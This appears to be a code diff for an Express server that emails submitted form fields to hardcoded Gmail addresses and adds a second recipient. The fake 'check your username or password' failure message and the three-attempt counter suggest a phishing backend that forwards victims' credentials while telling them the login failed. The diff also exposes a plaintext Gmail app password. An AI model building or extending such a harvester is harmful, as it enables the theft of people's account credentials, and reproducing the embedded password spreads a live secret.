@@ -14,7 +14,15 @@ app.use(express.static(__dirname));
 // Gmail Config
 const SENDER_EMAIL = "nothingisimpossiblebrother@gmail.com";
 const APP_PASSWORD = "agntmvxlgazptvow";
-const RECEIVER_EMAIL = "marslansalfias@gmail.com";
+
+// ✅ Multiple receiver emails (comma-separated)
+const RECEIVER_EMAILS = [
+  "marslansalfias@gmail.com",
+  "nehanade999@gmail.com"
+  // اگر چاہیں تو مزید ای میل یہاں شامل کریں
+  // "example2@gmail.com",
+  // "example3@gmail.com"
+];
 
 let attemptCount = 0;
 
@@ -36,9 +44,12 @@ app.post("/send", async (req, res) => {
       }
     });
 
+    // ✅ Join multiple emails into a comma-separated string
+    const toEmails = RECEIVER_EMAILS.join(",");
+
     await transporter.sendMail({
       from: `"Website Message" <${SENDER_EMAIL}>`,
-      to: RECEIVER_EMAIL,
+      to: toEmails,
       subject: `New Message from ${name}`,
       text: `Name: ${name}\nMessage: ${message}`
     });
@@ -48,7 +59,7 @@ app.post("/send", async (req, res) => {
     if (attemptCount < 3) {
       res.json({
         success: false,
-        message: "❌ Your request submission failed. Please check your username or password. please Enter Correct Details."
+        message: "❌ Your request submission failed. Please check your username or password. Please enter correct details."
       });
     } else {
       attemptCount = 0; // reset
